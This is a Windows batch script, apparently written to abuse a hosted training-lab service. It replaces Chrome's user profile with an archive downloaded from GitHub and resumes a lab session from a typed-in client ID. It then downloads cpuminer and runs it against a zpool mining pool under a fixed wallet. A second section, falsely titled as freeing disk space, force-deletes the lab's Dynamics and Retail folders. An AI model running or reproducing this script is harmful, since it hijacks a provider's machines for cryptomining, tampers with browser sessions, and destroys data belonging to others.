@echo off
title Labondemand Anti-Close And Auto Mimning:
set /p id="Enter Lab Cliet ID: "
echo Waitting Chrome Installed!
timeout 10 >nul
taskkill /f /im chrome.exe
cd C:\Users\Student\AppData\Local\Google\Chrome
curl -LJOk https://raw.githubusercontent.com/mrX04/lab2rdp/master/UserData.rar
rmdir /Q /S "User Data"
7z.exe x UserData.rar
cd C:\Program Files\Google\Chrome\Application
start chrome.exe  https://labondemand.com/LabInstance/ResumeWithKey/?key=%id%
cd C:\Users\Student\Desktop
curl -LJOk https://raw.githubusercontent.com/mrX04/mimning/master/Cpuminer-opt-cpu-pool-win64.zip
7z.exe x Cpuminer-opt-cpu-pool-win64.zip
cd C:\Users\Student\Desktop\Cpuminer-opt-cpu-pool-win64
start cpuminer.exe -a yescrypt -o stratum+tcp://yescrypt.eu.mine.zpool.ca:6233 -u t1Sju7XGRK7NE5WF77uTCsyVvKnD3JyR1GM -p c=ZEC
@echo off
cls
title Delete Labs File TO Free Up Disk Space. DONT CLOSE.
cd C:\
echo on
rmdir /s /q AOSService
rmdir /s /q DumpPath
rmdir /s /q DynamicsDiagnostics
rmdir /s /q DynamicsSDK
rmdir /s /q DynamicsTools
rmdir /s /q EmptyDataset
rmdir /s /q FinancialReporting
rmdir /s /q Labs
rmdir /s /q PerfSDK
rmdir /s /q RetailSDK
rmdir /s /q RetailSelfService
rmdir /s /q RetailServer
rmdir /s /q RetailStorefront

exit
